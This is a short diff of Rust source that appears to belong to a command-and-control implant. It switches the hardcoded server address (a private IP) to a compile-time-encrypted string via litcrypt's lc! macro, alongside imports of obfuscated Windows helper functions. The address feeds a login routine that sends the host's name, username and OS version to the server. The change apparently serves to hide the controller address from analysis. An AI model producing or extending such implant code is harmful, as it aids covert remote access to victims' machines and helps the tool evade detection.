@@ -4,7 +4,6 @@ use reqwest::blocking::ClientBuilder;
 
 use litcrypt::{lc, use_litcrypt};
 use_litcrypt!();
-use crate::obfwin::Constants::*;
 use crate::obfwin::Functions::*;
 
 mod commands;
@@ -201,9 +200,10 @@ fn main() {
     let versions = version.split('.').collect::<Vec<_>>();
 
     let major_v = versions.first().unwrap();
+
     let minor_v = versions.last().unwrap();
 
-    let base_url = "https://192.168.2.165";
+    let base_url = lc!("https://192.168.4.83");
 
     let resp = login(&*base_url, &*hostname, &*username, &*major_v, &*minor_v).unwrap();
 
